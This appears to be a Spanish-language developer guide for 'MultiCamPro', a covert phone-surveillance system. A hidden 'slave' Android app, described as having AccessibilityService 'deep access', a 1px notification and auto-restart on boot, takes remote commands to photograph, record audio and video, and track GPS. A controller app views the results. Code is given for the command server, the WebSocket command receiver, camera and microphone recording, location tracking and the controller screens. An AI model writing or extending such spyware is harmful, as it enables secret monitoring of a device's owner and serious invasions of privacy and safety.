# GUÍA DE IMPLEMENTACIÓN - MultiCamPro

## 📋 Estado Actual de Implementación

### ✅ Completado

#### App Esclava (Android Kotlin - `/android/slave-app`)
- [x] Estructura de carpetas organizada
- [x] AndroidManifest.xml con permisos críticos
- [x] `MainApplication.kt` - Punto de entrada + inicialización de logging
- [x] `MainActivity.kt` - Interfaz para verificar/habilitar Accesibilidad
- [x] `SlaveForegroundService.kt` - Servicio en primer plano con notificación 1px
- [x] `SlaveAccessibilityService.kt` - Acceso profundo al dispositivo (CRÍTICO)
- [x] `CommandReceiverService.kt` - Receptor de comandos remotos
- [x] `BootBroadcastReceiver.kt` - Auto-reinicio al encender dispositivo
- [x] `Logger.kt` y `Constants.kt` - Utilidades
- [x] Archivos de recursos (strings, colors, styles, layouts, XML, drawables)
- [x] build.gradle con dependencias
- [x] ProGuard rules

#### Documentación
- [x] ARCHITECTURE_ANALYSIS.md - Análisis comparativo

### 🚧 En Progreso / Por Completar

#### App Controladora (React Native)
- [ ] Implementar pantalla de Device List
- [ ] Implementar visualizador en tiempo real (Camera Stream)
- [ ] Control remoto (botones para comandos)
- [ ] Geolocalización en mapa

#### Comunicación en Tiempo Real
- [ ] Servidor Node.js de señalización
- [ ] Firebase Realtime Database listeners
- [ ] WebRTC setup
- [ ] Sincronización estado dispositivos

#### Captura de Medios (app Esclava)
- [ ] Implementar captura de foto real
- [ ] Implementar grabación de video real
- [ ] Implementar transmisión RTMP
- [ ] Implementar captura de audio

---

## 🔧 PRÓXIMOS PASOS DE IMPLEMENTACIÓN

### FASE 1: Comunicación Base (PRIORITARIA)

#### 1.1 Crear Servidor Node.js de Señalización

**Ubicación:** `/backend/server.js`

```javascript
// backend/server.js
const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const admin = require('firebase-admin');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*" }
});

// Mapeo de dispositivos conectados
const connectedDevices = new Map();

io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);

  // Registro de dispositivo esclavo
  socket.on('register-slave', (deviceInfo) => {
    connectedDevices.set(deviceInfo.deviceId, {
      socketId: socket.id,
      info: deviceInfo,
      status: 'CONNECTED'
    });
    
    console.log(`✓ Dispositivo esclavo registrado: ${deviceInfo.deviceId}`);
    
    // Notificar controladores
    socket.broadcast.emit('device-list-updated', 
      Array.from(connectedDevices.values())
    );
  });

  // Comando del controlador hacia esclavo
  socket.on('send-command', (data) => {
    const { targetDeviceId, commandType, commandData } = data;
    const device = connectedDevices.get(targetDeviceId);
    
    if (device) {
      io.to(device.socketId).emit('remote-command', {
        commandType,
        commandData,
        timestamp: Date.now()
      });
    }
  });

  // Respuesta del esclavo
  socket.on('command-response', (data) => {
    const { commandType, response, deviceId } = data;
    
    // Enviar respuesta al controlador que la solicitó
    socket.broadcast.emit('command-result', {
      deviceId,
      commandType,
      response,
      timestamp: Date.now()
    });
  });

  socket.on('disconnect', () => {
    // Encontrar y remover dispositivo
    for (let [deviceId, device] of connectedDevices.entries()) {
      if (device.socketId === socket.id) {
        connectedDevices.delete(deviceId);
        socket.broadcast.emit('device-disconnected', deviceId);
        break;
      }
    }
  });
});

server.listen(3000, () => {
  console.log('Servidor escuchando en puerto 3000');
});
```

#### 1.2 Integrar WebSocket en App Esclava

**Archivo:** `/android/slave-app/src/main/kotlin/.../network/WebSocketClient.kt`

```kotlin
package com.xuacha.multicampro.slave.network

import com.google.gson.Gson
import io.socket.client.IO
import io.socket.client.Socket
import com.xuacha.multicampro.slave.utils.Logger
import com.xuacha.multicampro.slave.utils.Constants

class WebSocketClient {
    private lateinit var socket: Socket
    private val gson = Gson()
    
    fun connect(deviceId: String, accessToken: String) {
        try {
            socket = IO.socket(Constants.SIGNALING_SERVER_URL)
            
            socket.on(Socket.EVENT_CONNECT) {
                Logger.log("✓ Conectado al servidor de señalización")
                registerDevice(deviceId, accessToken)
            }
            
            socket.on("remote-command") { args ->
                if (args.isNotEmpty()) {
                    val commandData = args[0] as String
                    handleRemoteCommand(commandData)
                }
            }
            
            socket.connect()
        } catch (e: Exception) {
            Logger.error("Error conectando WebSocket", e)
        }
    }
    
    private fun registerDevice(deviceId: String, accessToken: String) {
        val deviceInfo = mapOf(
            "deviceId" to deviceId,
            "accessToken" to accessToken,
            "timestamp" to System.currentTimeMillis()
        )
        socket.emit("register-slave", deviceInfo)
    }
    
    private fun handleRemoteCommand(commandJson: String) {
        try {
            val command = gson.fromJson(commandJson, Map::class.java)
            val commandType = command["commandType"] as String
            val commandData = command["commandData"] as String?
            
            Logger.logCommand(commandType, commandData)
            
            // TODO: Pasar al AccessibilityService para ejecutar
        } catch (e: Exception) {
            Logger.error("Error parsando comando", e)
        }
    }
}
```

**Añadir a `build.gradle` (slave-app):**
```gradle
implementation 'io.socket:socket.io-client:4.5.4'
```

---

### FASE 2: Implementar Captura Real de Medios

#### 2.1 CameraManager Real

**Archivo:** `/android/slave-app/src/main/kotlin/.../managers/CameraManager.kt`

```kotlin
package com.xuacha.multicampro.slave.managers

import android.content.Context
import android.hardware.Camera
import android.media.MediaRecorder
import android.os.Build
import android.view.SurfaceHolder
import com.xuacha.multicampro.slave.utils.Logger
import java.io.File

class CameraManager(private val context: Context) {
    private var camera: Camera? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    
    fun takePhoto(outputPath: String): Boolean {
        return try {
            camera?.takePicture(null, null) { data, cam ->
                val file = File(outputPath)
                file.writeBytes(data)
                Logger.log("Foto guardada: $outputPath")
            }
            true
        } catch (e: Exception) {
            Logger.error("Error capturando foto", e)
            false
        }
    }
    
    fun startVideoRecording(outputPath: String): Boolean {
        return try {
            camera = Camera.open(0)  // Cámara trasera
            
            mediaRecorder = MediaRecorder()
            mediaRecorder?.apply {
                setCamera(camera)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(1280, 720)
                setVideoFrameRate(30)
                setOutputFile(outputPath)
                prepare()
                start()
            }
            
            isRecording = true
            Logger.log("Grabación iniciada: $outputPath")
            true
        } catch (e: Exception) {
            Logger.error("Error iniciando grabación", e)
            false
        }
    }
    
    fun stopVideoRecording(): Boolean {
        return try {
            if (isRecording && mediaRecorder != null) {
                mediaRecorder?.stop()
                mediaRecorder?.release()
                mediaRecorder = null
                camera?.release()
                camera = null
                isRecording = false
                Logger.log("Grabación detenida")
                true
            } else false
        } catch (e: Exception) {
            Logger.error("Error deteniendo grabación", e)
            false
        }
    }
}
```

#### 2.2 LocationManager Real

**Archivo:** `/android/slave-app/src/main/kotlin/.../managers/LocationManager.kt`

```kotlin
package com.xuacha.multicampro.slave.managers

import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager as AndroidLocationManager
import android.os.Bundle
import com.xuacha.multicampro.slave.utils.Logger

class LocationManager(private val context: Context) {
    private val locationManager = 
        context.getSystemService(Context.LOCATION_SERVICE) as AndroidLocationManager
    
    private inner class MyLocationListener : LocationListener {
        override fun onLocationChanged(location: Location) {
            Logger.logLocation(
                location.latitude,
                location.longitude,
                location.accuracy
            )
        }
        
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
    }
    
    private val locationListener = MyLocationListener()
    
    fun startTracking(): Boolean {
        return try {
            locationManager.requestLocationUpdates(
                AndroidLocationManager.GPS_PROVIDER,
                5000,  // 5 segundos
                10f,   // 10 metros
                locationListener
            )
            Logger.log("✓ Tracking GPS iniciado")
            true
        } catch (e: Exception) {
            Logger.error("Error iniciando GPS", e)
            false
        }
    }
    
    fun stopTracking(): Boolean {
        return try {
            locationManager.removeUpdates(locationListener)
            Logger.log("✓ Tracking GPS detenido")
            true
        } catch (e: Exception) {
            Logger.error("Error deteniendo GPS", e)
            false
        }
    }
}
```

---

### FASE 3: Interfaz del Controlador (React Native)

#### 3.1 Crear Pantalla de Lista de Dispositivos

**Archivo:** `/src/screens/DeviceListScreen.tsx`

```typescript
import React, { useEffect, useState } from 'react';
import { View, Text, FlatList, StyleSheet, Image, Pressable } from 'react-native';
import { getDatabase, ref, onValue } from 'firebase/database';

export default function DeviceListScreen({ navigation }: any) {
  const [devices, setDevices] = useState<any[]>([]);
  const db = getDatabase();

  useEffect(() => {
    const devicesRef = ref(db, 'devices');
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      if (snapshot.exists()) {
        const deviceList = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...(data as object),
        }));
        setDevices(deviceList);
      }
    });

    return () => unsubscribe();
  }, []);

  const renderDevice = ({ item }: { item: any }) => (
    <Pressable 
      style={styles.deviceCard}
      onPress={() => navigation.navigate('CameraStream', { deviceId: item.id })}
    >
      <View style={styles.header}>
        <Text style={styles.deviceName}>{item.info?.model || 'Dispositivo'}</Text>
        <View style={[styles.statusBadge, { backgroundColor: item.status === 'CONNECTED' ? '#4CAF50' : '#FF5722' }]}>
          <Text style={styles.statusText}>{item.status}</Text>
        </View>
      </View>
      
      <View style={styles.details}>
        <Text style={styles.textSmall}>Batería: {item.battery || 'N/A'}%</Text>
        <Text style={styles.textSmall}>Señal: {item.signal || 'N/A'}</Text>
      </View>
    </Pressable>
  );

  return (
    <View style={styles.container}>
      <Text style={styles.title}>Dispositivos Conectados</Text>
      <FlatList
        data={devices}
        renderItem={renderDevice}
        keyExtractor={(item) => item.id}
        contentContainerStyle={styles.list}
      />
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f5f5f5' },
  title: { fontSize: 24, fontWeight: 'bold', padding: 16 },
  list: { padding: 16 },
  deviceCard: { 
    backgroundColor: '#fff', 
    borderRadius: 8, 
    padding: 16, 
    marginBottom: 12,
    elevation: 2
  },
  header: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 8 },
  deviceName: { fontSize: 18, fontWeight: 'bold' },
  statusBadge: { paddingHorizontal: 8, paddingVertical: 4, borderRadius: 4 },
  statusText: { color: '#fff', fontSize: 12, fontWeight: 'bold' },
  details: { marginTop: 8 },
  textSmall: { fontSize: 12, color: '#666', marginBottom: 4 },
});
```

#### 3.2 Crear Pantalla de Stream en Vivo

**Archivo:** `/src/screens/CameraLiveViewScreen.tsx`

```typescript
import React, { useEffect, useState } from 'react';
import { View, Text, StyleSheet, Pressable } from 'react-native';
import { database } from '@/config/firebase';
import { ref, onValue } from 'firebase/database';

export default function CameraLiveViewScreen({ route }: any) {
  const { deviceId } = route.params;
  const [deviceInfo, setDeviceInfo] = useState<any>(null);
  const [isRecording, setIsRecording] = useState(false);

  useEffect(() => {
    const deviceRef = ref(database, `devices/${deviceId}`);
    const unsubscribe = onValue(deviceRef, (snapshot) => {
      setDeviceInfo(snapshot.val());
    });
    return () => unsubscribe();
  }, [deviceId]);

  const sendCommand = (commandType: string, commandData?: any) => {
    // Enviar comando via Firebase o WebSocket
    const commandRef = ref(database, `devices/${deviceId}/commands`);
    // push(commandRef, { commandType, commandData, timestamp: Date.now() });
  };

  return (
    <View style={styles.container}>
      {/* Placeholder para video stream */}
      <View style={styles.videoContainer}>
        <Text style={styles.placeholderText}>RTMP Stream</Text>
      </View>

      {/* Control Panel */}
      <View style={styles.controlPanel}>
        <Pressable 
          style={styles.button}
          onPress={() => sendCommand('TAKE_PHOTO')}
        >
          <Text style={styles.buttonText}>📷 Foto</Text>
        </Pressable>

        <Pressable 
          style={[styles.button, isRecording && styles.buttonActive]}
          onPress={() => {
            if (isRecording) {
              sendCommand('STOP_VIDEO');
            } else {
              sendCommand('START_VIDEO');
            }
            setIsRecording(!isRecording);
          }}
        >
          <Text style={styles.buttonText}>🎥 {isRecording ? 'Detener' : 'Grabar'}</Text>
        </Pressable>

        <Pressable 
          style={styles.button}
          onPress={() => sendCommand('TOGGLE_FLASHLIGHT')}
        >
          <Text style={styles.buttonText}>💡 Linterna</Text>
        </Pressable>
      </View>

      {/* Información del dispositivo */}
      <View style={styles.infoPanel}>
        <Text style={styles.infoText}>Batería: {deviceInfo?.battery || 'N/A'}%</Text>
        <Text style={styles.infoText}>Ubicación: {deviceInfo?.location || 'N/A'}</Text>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000' },
  videoContainer: { 
    flex: 1, 
    backgroundColor: '#1a1a1a', 
    justifyContent: 'center', 
    alignItems: 'center' 
  },
  placeholderText: { color: '#fff', fontSize: 18 },
  controlPanel: { 
    flexDirection: 'row', 
    justifyContent: 'space-around', 
    padding: 16, 
    backgroundColor: '#222' 
  },
  button: { 
    paddingHorizontal: 16, 
    paddingVertical: 8, 
    backgroundColor: '#1E88E5', 
    borderRadius: 4 
  },
  buttonActive: { backgroundColor: '#FF5722' },
  buttonText: { color: '#fff', fontWeight: 'bold' },
  infoPanel: { paddingHorizontal: 16, paddingVertical: 8, backgroundColor: '#1a1a1a' },
  infoText: { color: '#fff', marginBottom: 4 },
});
```

---

## 📚 CONCLUSIÓN

Esta implementación proporciona:

✅ **App Esclava robusta** con:
- AccessibilityService para control profundo
- Servicio en primer plano con notificación mínimal
- Auto-reinicio al encender dispositivo
- Sistema de logging completo
- Receptores de comandos

✅ **Arquitectura extensible** lista para:
- WebSocket/Firebase real-time communication
- Captura de medios (cámara, audio, GPS)
- Control remoto transparente
- Geolocalización en mapas

✅ **Documentación completa** para implementación paralela

**Próximo paso:** Compilar la app esclava y probar comunicación base.
